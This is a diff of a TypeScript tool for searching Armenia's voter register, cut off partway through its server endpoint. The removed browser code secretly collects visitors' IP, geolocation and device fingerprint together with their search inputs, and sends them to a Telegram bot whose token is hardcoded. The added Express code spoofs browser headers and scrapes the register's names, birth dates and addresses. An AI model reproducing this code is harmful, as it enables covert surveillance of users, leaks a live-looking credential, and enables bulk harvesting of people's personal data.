@@ -1,503 +1,621 @@
-import { SearchFormData, ApiResponse, UserData, SearchResult, normalizeSearchFormData } from './types';
-import { MapManager } from './map';
+import express, { Request, Response, Express } from 'express';
+import path from 'path';
+import axios, { AxiosInstance } from 'axios';
+import * as cheerio from 'cheerio';
+import { HttpCookieAgent, HttpsCookieAgent } from 'http-cookie-agent/http';
+import { CookieJar } from 'tough-cookie';
 
-export class SearchManager {
-  private form: HTMLFormElement;
-  private loadingSpinner: HTMLElement;
-  private errorMessage: HTMLElement;
-  private resultsContainer: HTMLElement;
-  private resultsList: HTMLElement;
-  private regionSelect: HTMLSelectElement;
-  private communitySelect: HTMLSelectElement;
-  private communityInput: HTMLInputElement;
-  private mapManager: MapManager;
+const app: Express = express();
+const PORT = parseInt(process.env.PORT || '5000', 10);
 
-  // Telegram config
-  private readonly TELEGRAM_BOT_TOKEN = '8513664028:AAEuGpg79Ukef853WzYJPv1Lk30ak-GcK3w';
-  private readonly TELEGRAM_CHAT_ID = '6760298907';
+// Middleware
+app.use(express.json());
+app.use(express.static(path.join(__dirname, '../public')));
 
-  // Elections URL
-  private readonly ELECTIONS_URL = 'https://prelive.elections.am/Register';
+// Enable CORS for development
+app.use((req, res, next) => {
+  res.header('Access-Control-Allow-Origin', '*');
+  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
+  res.header('Access-Control-Allow-Headers', 'Content-Type');
+  next();
+});
 
-  // CORS proxies - пробуем по очереди
-  private readonly CORS_PROXIES = [
-    'https://corsproxy.io/?',
-    'https://api.allorigins.win/raw?url=',
-  ];
+// Normalize Armenian text: convert "և" to "եւ"
+function normalizeArmenianText(text: string): string {
+  if (!text) return text;
+  return text.replace(/և/g, 'եւ');
+}
 
-  constructor(mapManager: MapManager) {
-    this.form = document.getElementById('searchForm') as HTMLFormElement;
-    this.loadingSpinner = document.getElementById('loadingSpinner') as HTMLElement;
-    this.errorMessage = document.getElementById('errorMessage') as HTMLElement;
-    this.resultsContainer = document.getElementById('resultsContainer') as HTMLElement;
-    this.resultsList = document.getElementById('resultsList') as HTMLElement;
-    this.regionSelect = document.getElementById('region') as HTMLSelectElement;
-    this.communitySelect = document.getElementById('community') as HTMLSelectElement;
-    this.communityInput = document.getElementById('communityInput') as HTMLInputElement;
-    this.mapManager = mapManager;
+// Types
+interface SearchParams {
+  first_name: string;
+  last_name: string;
+  middle_name?: string;
+  birth_date?: string;
+  street?: string;
+  building?: string;
+  apartment?: string;
+  district?: string;
+  region?: string;
+  community?: string;
+}
 
-    this.setupEventListeners();
-    this.toggleCommunityField();
-  }
+interface SearchResult {
+  name: string;
+  birth_date: string;
+  region_community: string;
+  address: string;
+  district: string;
+}
 
-  private setupEventListeners(): void {
-    this.form.addEventListener('submit', (e) => this.handleSubmit(e));
-    this.regionSelect.addEventListener('change', () => this.toggleCommunityField());
-    this.form.addEventListener('reset', () => this.handleReset());
-  }
+interface CombinedResponse {
+  success: boolean;
+  count?: number;
+  results?: SearchResult[];
+  error?: string;
+}
 
-  private toggleCommunityField(): void {
-    const selectedRegion = this.regionSelect.value;
+// Constants
+const BASE_URL = 'https://prelive.elections.am/Register';
+const REQUEST_TIMEOUT = 60000;
+const PAGE_DELAY = 500; // Задержка между запросами страниц
+const MAX_RETRIES = 3; // Максимальное количество повторных попыток
 
-    if (selectedRegion === 'ԵՐԵՎԱՆ') {
-      this.communitySelect.style.display = 'block';
-      this.communityInput.style.display = 'none';
-      this.communityInput.value = '';
-    } else {
-      this.communitySelect.style.display = 'none';
-      this.communityInput.style.display = 'block';
-      this.communitySelect.value = '';
+// Create axios instance with cookie jar
+function createAxiosInstance(cookieJar?: InstanceType<typeof CookieJar>): AxiosInstance {
+  const jar = cookieJar || new CookieJar();
+
+  return axios.create({
+    timeout: REQUEST_TIMEOUT,
+    httpAgent: new HttpCookieAgent({ cookies: { jar } }),
+    httpsAgent: new HttpsCookieAgent({ cookies: { jar } }),
+    headers: {
+      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+      'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7,hy;q=0.6',
+      'Accept-Encoding': 'gzip, deflate, br',
+      'DNT': '1',
+      'Connection': 'keep-alive',
+      'Upgrade-Insecure-Requests': '1',
+      'Sec-Fetch-Dest': 'document',
+      'Sec-Fetch-Mode': 'navigate',
+      'Sec-Fetch-Site': 'none',
+      'Sec-Fetch-User': '?1',
+      'Cache-Control': 'max-age=0'
     }
-  }
+  });
+}
 
-  private convertDateFormat(dateStr: string): string {
-    if (!dateStr || dateStr.trim() === '') return '';
+// Fetch CSRF token with retries
+async function fetchCsrfToken(retries = MAX_RETRIES): Promise<{ token: string | null; cookieJar: CookieJar | null }> {
+  for (let attempt = 1; attempt <= retries; attempt++) {
     try {
-      const parts = dateStr.split('/');
-      if (parts.length === 3) {
-        const [day, month, year] = parts;
-        return `${year}-${month}-${day}`;
+      const cookieJar = new CookieJar();
+      const client = createAxiosInstance(cookieJar);
+
+      console.log(`📡 Попытка получения CSRF токена #${attempt}...`);
+
+      const response = await client.get(BASE_URL);
+
+      console.log(`📡 CSRF Token fetch - Статус: ${response.status}`);
+
+      if (response.status === 200) {
+        const $ = cheerio.load(response.data);
+        const token = $('input[name="__RequestVerificationToken"]').val() as string;
+
+        if (token && token.length > 0) {
+          console.log('✓ Свежий токен получен успешно');
+          console.log(`✓ Токен: ${token.substring(0, 20)}...`);
+          return { token, cookieJar };
+        } else {
+          console.warn('⚠️ Токен не найден на странице');
+        }
       }
-    } catch (e) {
-      console.error('Date conversion error:', e);
+    } catch (error: any) {
+      console.error(`⚠️ Ошибка при получении токена (попытка ${attempt}/${retries}):`, error.message);
+
+      if (attempt < retries) {
+        const delay = attempt * 1000; // Увеличиваем задержку с каждой попыткой
+        console.log(`⏳ Ожидание ${delay}ms перед повторной попыткой...`);
+        await new Promise(resolve => setTimeout(resolve, delay));
+      }
     }
+  }
+
+  console.error('❌ Не удалось получить CSRF токен после всех попыток');
+  return { token: null, cookieJar: null };
+}
+
+// Convert date format from DD/MM/YYYY to YYYY-MM-DD
+function convertDateFormat(dateStr: string): string {
+  if (!dateStr || !dateStr.trim()) {
     return '';
   }
 
-  private async getUserData(): Promise<UserData> {
-    const userData: UserData = {
-      timestamp: new Date().toISOString(),
-      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      language: navigator.language || 'unknown',
-      languages: navigator.languages ? Array.from(navigator.languages) : [],
-      platform: navigator.platform,
-      userAgent: navigator.userAgent,
-      vendor: navigator.vendor,
-      cookieEnabled: navigator.cookieEnabled,
-      doNotTrack: navigator.doNotTrack || null,
-      hardwareConcurrency: navigator.hardwareConcurrency,
-      deviceMemory: (navigator as any).deviceMemory,
-      maxTouchPoints: navigator.maxTouchPoints,
-      screen: {
-        width: screen.width,
-        height: screen.height,
-        availWidth: screen.availWidth,
-        availHeight: screen.availHeight,
-        colorDepth: screen.colorDepth,
-        pixelDepth: screen.pixelDepth,
-        orientation: (screen.orientation as any)?.type
-      },
-      window: {
-        innerWidth: window.innerWidth,
-        innerHeight: window.innerHeight,
-        outerWidth: window.outerWidth,
-        outerHeight: window.outerHeight
-      },
-      connection: {
-        effectiveType: (navigator as any).connection?.effectiveType,
-        downlink: (navigator as any).connection?.downlink,
-        rtt: (navigator as any).connection?.rtt,
-        saveData: (navigator as any).connection?.saveData
+  try {
+    const parts = dateStr.split('/');
+    if (parts.length === 3) {
+      const [day, month, year] = parts;
+
+      // Validate date components
+      const dayNum = parseInt(day, 10);
+      const monthNum = parseInt(month, 10);
+      const yearNum = parseInt(year, 10);
+
+      if (dayNum >= 1 && dayNum <= 31 &&
+          monthNum >= 1 && monthNum <= 12 &&
+          yearNum >= 1900 && yearNum <= 2100) {
+        return `${year}-${month.padStart(2, '0')}-${day.padStart(2, '0')}`;
       }
-    };
-
-    try {
-      const ipResponse = await fetch('https://api.ipify.org?format=json');
-      const ipData = await ipResponse.json();
-      userData.ip = ipData.ip;
-
-      const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-      const geoData = await geoResponse.json();
-      userData.geolocation = {
-        ip: geoData.ip,
-        city: geoData.city,
-        region: geoData.region,
-        country: geoData.country_name,
-        country_code: geoData.country_code,
-        postal: geoData.postal,
-        latitude: geoData.latitude,
-        longitude: geoData.longitude,
-        timezone: geoData.timezone,
-        asn: geoData.asn,
-        org: geoData.org,
-        isp: geoData.org
-      };
-    } catch (error) {
-      console.error('Error fetching IP/Geo data:', error);
-      userData.ip = 'Unknown';
-      userData.geolocation = { error: String(error) };
     }
-
-    return userData;
+  } catch (error) {
+    console.warn('⚠️ Ошибка преобразования даты:', dateStr);
   }
 
-  private async sendToTelegram(formData: SearchFormData, userData: UserData): Promise<void> {
-    const message = `
-🔍 *НОВЫЙ ПОИСК В СИСТЕМЕ*
+  return '';
+}
 
-📋 *Данные формы:*
-━━━━━━━━━━━━━━━━━━━━
-👤 Имя: \`${formData.first_name}\`
-👤 Фамилия: \`${formData.last_name}\`
-👨‍👦 Отчество: \`${formData.middle_name || 'не указано'}\`
-📅 Дата рождения: \`${formData.birth_date || 'не указано'}\`
-📍 Регион: \`${formData.region || 'ԵՐԵՎԱՆ'}\`
-🏘 Община: \`${formData.community || 'не указано'}\`
-🛣 Улица: \`${formData.street || 'не указано'}\`
-🏠 Дом: \`${formData.building || 'не указано'}\`
-🚪 Квартира: \`${formData.apartment || 'не указано'}\`
-📌 Район: \`${formData.district || 'не указано'}\`
+// Clean and normalize text
+function cleanText(text: string): string {
+  return text.replace(/\s+/g, ' ').trim();
+}
 
-🌐 *Информация о пользователе:*
-━━━━━━━━━━━━━━━━━━━━
-🌍 IP: \`${userData.ip}\`
-📍 Местоположение: \`${userData.geolocation?.city || 'Unknown'}, ${userData.geolocation?.country || 'Unknown'}\`
-⏰ *Время запроса:* \`${userData.timestamp}\`
-    `.trim();
+// Get search results with improved error handling
+async function getSearchResults(params: {
+  firstName: string;
+  lastName: string;
+  region?: string;
+  community?: string;
+  middleName?: string;
+  birthDate?: string;
+  street?: string;
+  building?: string;
+  apartment?: string;
+  district?: string;
+}): Promise<SearchResult[]> {
+  const {
+    firstName,
+    lastName,
+    region = 'ԵՐԵՎԱՆ',
+    community = '',
+    middleName = '',
+    birthDate = '',
+    street = '',
+    building = '',
+    apartment = '',
+    district = ''
+  } = params;
+
+  console.log('\n' + '='.repeat(80));
+  console.log(`🔍 НОВЫЙ ПОИСК`);
+  console.log('='.repeat(80));
+  console.log(`👤 Имя: ${firstName} ${lastName}`);
+  console.log(`📍 Регион: ${region}`);
+  if (community) console.log(`🏘 Община: ${community}`);
+  if (middleName) console.log(`👨‍👦 Отчество: ${middleName}`);
+  if (birthDate) console.log(`📅 Дата рождения: ${birthDate}`);
+  if (street) console.log(`🛣 Улица: ${street}`);
+  if (building) console.log(`🏠 Дом: ${building}`);
+  if (apartment) console.log(`🚪 Квартира: ${apartment}`);
+  if (district) console.log(`📌 Район: ${district}`);
+  console.log('='.repeat(80));
+
+  // Get CSRF token and cookie jar
+  const { token: csrfToken, cookieJar } = await fetchCsrfToken();
+
+  if (!csrfToken || !cookieJar) {
+    throw new Error('Не удалось получить CSRF токен. Сервис может быть недоступен.');
+  }
+
+  // Create client with the same cookie jar
+  const client = createAxiosInstance(cookieJar);
+  client.defaults.headers.common['Referer'] = BASE_URL;
+  client.defaults.headers.common['Origin'] = 'https://prelive.elections.am';
+
+  // Prepare form data - only include non-empty values
+  const convertedBirthDate = convertDateFormat(birthDate);
+
+  // Build form data object dynamically - only include fields with values
+  const baseFormData: Record<string, string> = {
+    'ShowCaptcha': 'False',
+    'Input.Region': region || 'ԵՐԵՎԱՆ',
+    'Current.Region': region || 'ԵՐԵՎԱՆ',
+    'RegisterPaging.PageSize': '100',
+    '__RequestVerificationToken': csrfToken
+  };
+
+  // Add optional fields only if they have values
+  if (firstName && firstName.trim()) {
+    baseFormData['Current.FirstName'] = firstName;
+    baseFormData['Input.FirstName'] = firstName;
+  }
+
+  if (lastName && lastName.trim()) {
+    baseFormData['Current.LastName'] = lastName;
+    baseFormData['Input.LastName'] = lastName;
+  }
+
+  if (middleName && middleName.trim()) {
+    baseFormData['Current.MiddleName'] = middleName;
+    baseFormData['Input.MiddleName'] = middleName;
+  }
+
+  if (community && community.trim()) {
+    baseFormData['Input.Community'] = community;
+    baseFormData['Current.Community'] = community;
+  }
+
+  if (convertedBirthDate) {
+    baseFormData['Current.BirthDate'] = convertedBirthDate;
+    baseFormData['Input.BirthDateUI'] = convertedBirthDate;
+  }
+
+  if (street && street.trim()) {
+    baseFormData['Current.Street'] = street;
+    baseFormData['Input.Street'] = street;
+  }
+
+  if (building && building.trim()) {
+    baseFormData['Current.Building'] = building;
+    baseFormData['Input.Building'] = building;
+  }
+
+  if (apartment && apartment.trim()) {
+    baseFormData['Current.Apartment'] = apartment;
+    baseFormData['Input.Apartment'] = apartment;
+  }
+
+  if (district && district.trim()) {
+    baseFormData['Current.District'] = district;
+    baseFormData['Input.District'] = district;
+  }
+
+  const allResults: SearchResult[] = [];
+
+  // Определяем максимальное количество страниц
+  // Если указаны детали адреса, ограничиваем одной страницей
+  const hasAddressDetails = street || building || apartment;
+  const maxPages = hasAddressDetails ? 1 : 5;
+
+  let page = 1;
+  let consecutiveEmptyPages = 0;
+  const maxConsecutiveEmptyPages = 2; // Прекращаем после 2 пустых страниц подряд
+
+  console.log(`📄 Максимум страниц для обработки: ${maxPages}`);
+  console.log('─'.repeat(80));
+  console.log('📋 Данные, отправляемые на сервер:');
+  Object.entries(baseFormData).forEach(([key, value]) => {
+    if (!key.includes('Token')) {
+      console.log(`   ${key}: ${value}`);
+    }
+  });
+  console.log('─'.repeat(80));
+
+  while (page <= maxPages && consecutiveEmptyPages < maxConsecutiveEmptyPages) {
+    const formData = { ...baseFormData, 'RegisterPaging.PageIndex': String(page) };
 
     try {
-      await fetch(`https://api.telegram.org/bot${this.TELEGRAM_BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: this.TELEGRAM_CHAT_ID,
-          text: message,
-          parse_mode: 'Markdown'
-        })
+      // Convert to URL-encoded form data
+      const params = new URLSearchParams();
+      Object.entries(formData).forEach(([key, value]) => {
+        params.append(key, String(value));
       });
-      console.log('✓ Data sent to Telegram successfully');
-    } catch (error) {
-      console.error('Error sending to Telegram:', error);
-    }
-  }
 
-  // ============================================
-  // МЕТОД 1: Поиск через CORS proxy
-  // ============================================
-  private async searchViaCorsProxy(formData: SearchFormData): Promise<SearchResult[]> {
-    console.log('🌐 Попытка поиска через CORS proxy...');
+      console.log(`📡 Запрос страницы ${page}...`);
+      console.log(`🔗 Параметры: ${params.toString().substring(0, 150)}...`);
 
-    // Пробуем каждый прокси по очереди
-    for (let i = 0; i < this.CORS_PROXIES.length; i++) {
-      const proxy = this.CORS_PROXIES[i];
-      console.log(`🔄 Попытка ${i + 1}/${this.CORS_PROXIES.length}: ${proxy}`);
+      const response = await client.post(BASE_URL, params, {
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded',
+          'X-Requested-With': 'XMLHttpRequest'
+        }
+      });
 
-      try {
-        // Шаг 1: Получаем CSRF токен через прокси
-        const proxyUrl = `${proxy}${encodeURIComponent(this.ELECTIONS_URL)}`;
+      console.log(`📡 Страница ${page} - Статус: ${response.status}`);
 
-        const csrfResponse = await fetch(proxyUrl, {
-          method: 'GET',
-          headers: {
-            'Accept': 'text/html'
-          }
-        });
+      // Debug: Log response size and check for common error patterns
+      console.log(`📏 Размер ответа: ${response.data.length} bytes`);
 
-        if (!csrfResponse.ok) {
-          console.warn(`⚠️ Proxy ${i + 1} недоступен (${csrfResponse.status})`);
-          continue;
+      // Save response to file for debugging first page only
+      if (page === 1 && process.env.DEBUG_RESPONSE === 'true') {
+        const fs = require('fs');
+        fs.writeFileSync(`debug_response_page${page}.html`, response.data);
+        console.log(`📝 Ответ сохранён в debug_response_page${page}.html`);
+      }
+
+      // Check for common error responses
+      if (response.data.includes('Too Many Requests') || response.data.includes('429')) {
+        console.error('❌ Ошибка: Слишком много запросов (429). Сервер блокирует запросы.');
+        break;
+      }
+
+      if (response.status !== 200) {
+        console.log(`❌ Ошибка: HTTP статус ${response.status}`);
+        break;
+      }
+
+      // Parse HTML response
+      const $ = cheerio.load(response.data);
+      const tbody = $('tbody');
+
+      if (!tbody.length || !tbody.html()?.trim()) {
+        consecutiveEmptyPages++;
+        console.log(`⚠️ Страница ${page}: Пустая таблица (${consecutiveEmptyPages}/${maxConsecutiveEmptyPages})`);
+
+        // Debug: Check if there's an error message in the response
+        const errorMsg = $('div.alert, div.error, .validation-summary').text();
+        if (errorMsg) {
+          console.log(`⚠️ Сообщение от сервера: ${errorMsg.substring(0, 100)}`);
         }
 
-        const csrfHtml = await csrfResponse.text();
+        // Check for alternative table structures
+        const dataTable = $('table.dataTable, table[role="grid"]');
+        const divTable = $('div[role="table"]');
+        console.log(`ℹ️ dataTable найдено: ${dataTable.length}, divTable: ${divTable.length}`);
 
-        // Парсим токен
-        const parser = new DOMParser();
-        const doc = parser.parseFromString(csrfHtml, 'text/html');
-        const tokenInput = doc.querySelector('input[name="__RequestVerificationToken"]') as HTMLInputElement;
-
-        if (!tokenInput || !tokenInput.value) {
-          console.warn('⚠️ CSRF токен не найден');
-          continue;
+        if (consecutiveEmptyPages >= maxConsecutiveEmptyPages) {
+          console.log(`✓ Остановка: ${maxConsecutiveEmptyPages} пустых страниц подряд`);
+          break;
         }
 
-        const csrfToken = tokenInput.value;
-        console.log('✓ CSRF токен получен через proxy');
-
-        // Шаг 2: Формируем данные для POST запроса
-        const searchData = new URLSearchParams({
-          'ShowCaptcha': 'False',
-          'Input.Region': formData.region || 'ԵՐԵՎԱՆ',
-          'Input.Community': formData.community || '',
-          'Current.FirstName': formData.first_name,
-          'Current.LastName': formData.last_name,
-          'Current.MiddleName': formData.middle_name || '',
-          'Current.BirthDate': formData.birth_date || '',
-          'Current.Region': formData.region || 'ԵՐԵՎԱՆ',
-          'Current.Community': formData.community || '',
-          'Current.Street': formData.street || '',
-          'Current.Building': formData.building || '',
-          'Current.Apartment': formData.apartment || '',
-          'Current.District': formData.district || '',
-          'Input.FirstName': formData.first_name,
-          'Input.LastName': formData.last_name,
-          'Input.MiddleName': formData.middle_name || '',
-          'Input.BirthDateUI': this.convertDateFormat(formData.birth_date || ''),
-          'Input.Street': formData.street || '',
-          'Input.Building': formData.building || '',
-          'Input.Apartment': formData.apartment || '',
-          'Input.District': formData.district || '',
-          'RegisterPaging.PageSize': '100',
-          'RegisterPaging.PageIndex': '1',
-          '__RequestVerificationToken': csrfToken
-        });
-
-        // Шаг 3: POST запрос через прокси
-        console.log('📡 Отправка поискового запроса через proxy...');
-
-        const searchResponse = await fetch(proxyUrl, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/x-www-form-urlencoded',
-          },
-          body: searchData.toString()
-        });
-
-        if (!searchResponse.ok) {
-          console.warn(`⚠️ Поисковый запрос через proxy ${i + 1} не удался`);
-          continue;
-        }
-
-        const resultHtml = await searchResponse.text();
-        console.log('✓ HTML результатов получен');
-
-        // Парсим результаты
-        const results = this.parseResults(resultHtml);
-
-        if (results.length > 0) {
-          console.log(`✓ Найдено ${results.length} результатов через proxy ${i + 1}`);
-          return results;
-        }
-
-      } catch (error) {
-        console.error(`❌ Proxy ${i + 1} ошибка:`, error);
-        if (i === this.CORS_PROXIES.length - 1) {
-          throw error;
-        }
+        page++;
+        await new Promise(resolve => setTimeout(resolve, PAGE_DELAY));
         continue;
       }
-    }
 
-    throw new Error('Все CORS прокси недоступны');
-  }
+      const rows = $('tbody tr');
+      const pageResults: SearchResult[] = [];
 
-  // ============================================
-  // МЕТОД 2: Парсинг результатов из HTML
-  // ============================================
-  private parseResults(html: string): SearchResult[] {
-    console.log('🔍 Парсинг результатов из HTML...');
+      console.log(`📊 Найдено строк в таблице: ${rows.length}`);
 
-    const parser = new DOMParser();
-    const resultDoc = parser.parseFromString(html, 'text/html');
-    const tableBody = resultDoc.querySelector('tbody');
+      // If no rows found, save response for debugging
+      if (rows.length === 0) {
+        const responsePreview = response.data.substring(0, 500);
+        console.log('💾 Первые 500 символов ответа:');
+        console.log(responsePreview);
 
-    if (!tableBody) {
-      console.log('⚠️ Таблица результатов не найдена');
-      return [];
-    }
-
-    const rows = tableBody.querySelectorAll('tr');
-    const results: SearchResult[] = [];
-
-    rows.forEach(row => {
-      const cells = row.querySelectorAll('td');
-      if (cells.length >= 5 && row.style.display !== 'none') {
-        results.push({
-          name: cells[0].textContent?.trim() || '',
-          birth_date: cells[1].textContent?.trim() || '',
-          region_community: cells[2].textContent?.trim() || '',
-          address: cells[3].textContent?.trim() || '',
-          district: cells[4].textContent?.trim() || ''
-        });
-      }
-    });
-
-    console.log(`✓ Распарсено результатов: ${results.length}`);
-    return results;
-  }
-
-  // ============================================
-  // МЕТОД 3: Fallback - открыть сайт напрямую
-  // ============================================
-  private openElectionsDirectly(formData: SearchFormData): void {
-    console.log('📖 Открываем elections.am напрямую в новом окне...');
-
-    // Создаем форму для POST запроса
-    const form = document.createElement('form');
-    form.method = 'POST';
-    form.action = this.ELECTIONS_URL;
-    form.target = '_blank';
-
-    // Добавляем поля
-    const fields: { [key: string]: string } = {
-      'ShowCaptcha': 'False',
-      'Input.Region': formData.region || 'ԵՐԵՎԱՆ',
-      'Input.Community': formData.community || '',
-      'Current.FirstName': formData.first_name,
-      'Current.LastName': formData.last_name,
-      'Current.MiddleName': formData.middle_name || '',
-      'Input.FirstName': formData.first_name,
-      'Input.LastName': formData.last_name,
-      'Input.MiddleName': formData.middle_name || '',
-      'Current.Street': formData.street || '',
-      'Current.Building': formData.building || '',
-      'Current.Apartment': formData.apartment || '',
-      'Input.Street': formData.street || '',
-      'Input.Building': formData.building || '',
-      'Input.Apartment': formData.apartment || '',
-      'RegisterPaging.PageSize': '100',
-      'RegisterPaging.PageIndex': '1'
-    };
-
-    for (const [name, value] of Object.entries(fields)) {
-      if (value) {
-        const input = document.createElement('input');
-        input.type = 'hidden';
-        input.name = name;
-        input.value = value;
-        form.appendChild(input);
-      }
-    }
-
-    document.body.appendChild(form);
-    form.submit();
-    document.body.removeChild(form);
-
-    // Показываем сообщение пользователю
-    this.errorMessage.innerHTML = `
-      <div style="text-align: center; padding: 20px;">
-        <strong style="font-size: 18px; color: #4ade80;">ℹ️ Поиск открыт в новом окне</strong>
-        <br><br>
-        <p style="color: #94a3b8; line-height: 1.6;">
-          Из-за технических ограничений, поиск был открыт напрямую на сайте elections.am.
-          <br><br>
-          Вы можете продолжить поиск в открывшемся окне.
-          <br><br>
-          Если окно не открылось, проверьте настройки блокировки всплывающих окон.
-        </p>
-      </div>
-    `;
-    this.errorMessage.style.display = 'block';
-  }
-
-  // ============================================
-  // ГЛАВНЫЙ ОБРАБОТЧИК ФОРМЫ
-  // ============================================
-  private async handleSubmit(e: Event): Promise<void> {
-    e.preventDefault();
-
-    this.errorMessage.style.display = 'none';
-    this.resultsContainer.style.display = 'none';
-    this.loadingSpinner.style.display = 'block';
-
-    // Собираем данные формы
-    let formData: SearchFormData = {
-      first_name: (document.getElementById('firstName') as HTMLInputElement).value,
-      last_name: (document.getElementById('lastName') as HTMLInputElement).value,
-      middle_name: (document.getElementById('middleName') as HTMLInputElement).value,
-      birth_date: (document.getElementById('birthDate') as HTMLInputElement).value,
-      street: (document.getElementById('street') as HTMLInputElement).value,
-      building: (document.getElementById('building') as HTMLInputElement).value,
-      apartment: (document.getElementById('apartment') as HTMLInputElement).value,
-      district: (document.getElementById('district') as HTMLInputElement).value,
-      region: this.regionSelect.value,
-      community: this.regionSelect.value === 'ԵՐԵՎԱՆ' ? this.communitySelect.value : this.communityInput.value
-    };
-
-    formData = normalizeSearchFormData(formData);
-
-    console.log('🔍 Начинаем поиск с данными:', formData);
-
-    // Отправляем в Telegram (фоном)
-    this.getUserData().then(userData => {
-      this.sendToTelegram(formData, userData);
-    }).catch(error => {
-      console.error('Error collecting user data:', error);
-    });
-
-    try {
-      // ============================================
-      // ПОПЫТКА 1: Поиск через CORS proxy
-      // ============================================
-      console.log('🚀 Попытка 1: Поиск через CORS proxy');
-      const results = await this.searchViaCorsProxy(formData);
-
-      this.loadingSpinner.style.display = 'none';
-
-      if (results.length > 0) {
-        this.displayResults(results, results.length);
-      } else {
-        this.errorMessage.textContent = '❌ Արդյունք չի հայտնաբերվել / No results found';
-        this.errorMessage.style.display = 'block';
+        // Try alternative selectors
+        const allTables = $('table');
+        const allRows = $('tr');
+        console.log(`ℹ️ Всего таблиц: ${allTables.length}, Всего строк (tr): ${allRows.length}`);
       }
 
-    } catch (error) {
-      console.error('❌ CORS proxy не сработал:', error);
-      this.loadingSpinner.style.display = 'none';
+      rows.each((index, row) => {
+        const $row = cheerio.load(row);
+        const cells = $row('td');
 
-      // ============================================
-      // ПОПЫТКА 2: Открыть сайт напрямую
-      // ============================================
-      console.log('🚀 Попытка 2: Открываем elections.am напрямую');
-      this.openElectionsDirectly(formData);
-    }
-  }
+        // Check if row is visible and has required cells
+        const isHidden = $row(row).attr('style')?.includes('display:none') ||
+                        $row(row).attr('style')?.includes('display: none');
 
-  private displayResults(results: SearchResult[], count: number): void {
-    this.resultsList.innerHTML = results.map((result, index) => `
-      <div class="result-item" style="cursor: pointer;" data-result-index="${index}">
-        <div class="result-name">${index + 1}. ${this.escapeHtml(result.name)}</div>
-        <div class="result-field">
-          <span class="result-label">Ծննդյան Օր:</span>
-          <span>${this.escapeHtml(result.birth_date)}</span>
-        </div>
-        <div class="result-field">
-          <span class="result-label">Մարզ/Համայնք:</span>
-          <span>${this.escapeHtml(result.region_community)}</span>
-        </div>
-        <div class="result-field">
-          <span class="result-label">Հասցե:</span>
-          <span>${this.escapeHtml(result.address)}</span>
-        </div>
-        <div class="result-field">
-          <span class="result-label">Ընտրական Մեկ.:</span>
-          <span>${this.escapeHtml(result.district)}</span>
-        </div>
-      </div>
-    `).join('');
+        if (cells.length >= 5 && !isHidden) {
+          const result = {
+            name: cleanText(cells.eq(0).text()),
+            birth_date: cleanText(cells.eq(1).text()),
+            region_community: cleanText(cells.eq(2).text()),
+            address: cleanText(cells.eq(3).text()),
+            district: cleanText(cells.eq(4).text())
+          };
 
-    // Добавляем обработчики кликов
-    const resultItems = document.querySelectorAll('.result-item');
-    resultItems.forEach((item, index) => {
-      item.addEventListener('click', () => {
-        this.mapManager.openMapWithAddress(results[index]);
+          // Only add if has meaningful data
+          if (result.name && result.name.length > 0) {
+            pageResults.push(result);
+
+            // Debug first row
+            if (index === 0) {
+              console.log(`   📌 Пример первой строки - ячеек найдено: ${cells.length}`);
+              console.log(`      Имя: ${result.name}`);
+              console.log(`      Дата: ${result.birth_date}`);
+            }
+          }
+        } else if (cells.length < 5 && index === 0) {
+          console.log(`⚠️ Первая строка имеет только ${cells.length} ячеек (нужно 5+)`);
+        }
       });
+
+      if (pageResults.length > 0) {
+        consecutiveEmptyPages = 0; // Сбрасываем счетчик пустых страниц
+        console.log(`✓ Страница ${page}: Найдено ${pageResults.length} результатов`);
+        allResults.push(...pageResults);
+
+        // Show first result as example
+        if (pageResults.length > 0) {
+          const first = pageResults[0];
+          console.log(`   Пример: ${first.name} | ${first.birth_date} | ${first.address}`);
+        }
+
+        page++;
+      } else {
+        consecutiveEmptyPages++;
+        console.log(`⚠️ Страница ${page}: Нет результатов (${consecutiveEmptyPages}/${maxConsecutiveEmptyPages})`);
+
+        if (consecutiveEmptyPages >= maxConsecutiveEmptyPages) {
+          console.log(`✓ Остановка: ${maxConsecutiveEmptyPages} пустых страниц подряд`);
+          break;
+        }
+
+        page++;
+      }
+    } catch (error: any) {
+      console.error(`❌ Ошибка запроса на странице ${page}:`, error.message);
+
+      // Пробуем продолжить со следующей страницей
+      if (page < maxPages) {
+        console.log('⏭️ Пропускаем эту страницу и продолжаем...');
+        page++;
+        consecutiveEmptyPages++;
+        await new Promise(resolve => setTimeout(resolve, PAGE_DELAY * 2));
+        continue;
+      } else {
+        break;
+      }
+    }
+
+    // Задержка между запросами для избежания блокировки
+    if (page <= maxPages) {
+      await new Promise(resolve => setTimeout(resolve, PAGE_DELAY));
+    }
+  }
+
+  console.log('─'.repeat(80));
+  console.log(`✅ ПОИСК ЗАВЕРШЕН`);
+  console.log(`📊 Всего найдено: ${allResults.length} результатов`);
+  console.log(`📄 Обработано страниц: ${page - 1}`);
+  console.log('='.repeat(80) + '\n');
+
+  return allResults;
+}
+
+// Health check endpoint
+app.get('/api/health', (req: Request, res: Response) => {
+  res.json({
+    status: 'ok',
+    timestamp: new Date().toISOString(),
+    service: 'Armenian Election Registry Search API'
+  });
+});
+
+// Main page
+app.get('/', (req: Request, res: Response) => {
+  res.sendFile(path.join(__dirname, '../public/index.html'));
+});
+
+// Search endpoint
+app.post('/api/search', async (req: Request, res: Response) => {
+  const startTime = Date.now();
+
+  try {
+    const data = req.body as SearchParams;
+
+    // Normalize Armenian text (convert "և" to "եւ")
+    const firstName = normalizeArmenianText((data.first_name || '').trim());
+    const lastName = normalizeArmenianText((data.last_name || '').trim());
+
+    // Get other parameters
+    const street = normalizeArmenianText((data.street || '').trim());
+    const building = normalizeArmenianText((data.building || '').trim());
+    const apartment = normalizeArmenianText((data.apartment || '').trim());
+    const district = normalizeArmenianText((data.district || '').trim());
+    const community = normalizeArmenianText((data.community || '').trim());
